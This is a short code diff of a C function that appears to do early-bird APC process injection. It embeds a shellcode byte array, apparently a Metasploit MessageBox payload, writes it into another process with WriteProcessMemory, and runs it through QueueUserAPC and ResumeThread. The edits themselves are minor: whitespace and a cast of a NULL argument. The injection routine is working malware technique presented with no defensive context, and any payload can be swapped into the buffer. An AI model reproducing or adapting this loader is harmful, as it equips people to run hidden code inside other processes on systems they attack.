@@ -50,8 +50,9 @@ int createProcessF()
 
 {
 
+  
     unsigned char buf[] = 
-                            "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
+                           "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41"
                             "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
                             "\x3e\x48\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72"
                             "\x50\x3e\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac"
@@ -75,6 +76,7 @@ int createProcessF()
                             "\xd5\x48\x65\x6c\x6c\x6f\x2c\x20\x66\x72\x6f\x6d\x20\x4d"
                             "\x53\x46\x21\x00\x4d\x65\x73\x73\x61\x67\x65\x42\x6f\x78"
                             "\x00";
+
 
     size_t shellcode = sizeof(buf);
     STARTUPINFOW si = {0};
@@ -110,7 +112,7 @@ int createProcessF()
     PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shelladdress;
 
     WriteProcessMemory(hProcess, shelladdress, buf, shellcode, NULL);
-    QueueUserAPC((PAPCFUNC)shelladdress, hThread, NULL);
+    QueueUserAPC((PAPCFUNC)shelladdress, hThread, (ULONG_PTR)0);
     ResumeThread(hThread);
 
     return 0;
